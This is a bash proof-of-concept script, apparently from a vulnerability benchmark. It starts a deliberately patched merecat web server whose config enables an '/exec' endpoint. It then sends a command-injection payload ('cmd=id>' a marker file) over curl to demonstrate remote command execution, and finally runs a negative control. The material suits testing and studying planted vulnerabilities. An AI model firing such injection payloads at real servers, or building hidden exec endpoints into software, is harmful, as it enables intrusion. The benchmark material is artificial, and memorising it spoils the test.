#!/usr/bin/env bash
# PoC for 154_merecat_C2I2S1
# Axes: C2 (config file gate) / I2 (snprintf buffer) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (merecat) lives in this directory. If it is absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_154_www"
MARKER="/tmp/poc_154_marker"
CONF="/tmp/poc_154.conf"
PORT=18154
NEG_PORT=19154

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file that enables exec endpoint
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# ── start server with config file ──────────────────────────────────────────────
echo "[*] starting merecat with --exec-config on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-config "$CONF" &
SERVER_PID=$!
sleep 2

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: no config file → gate disabled → 404 ───────────────────
echo "[*] verifying gate: endpoint absent without --exec-config..."
"$BINARY" -n -p "$NEG_PORT" "$WWWROOT" &
NEG_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
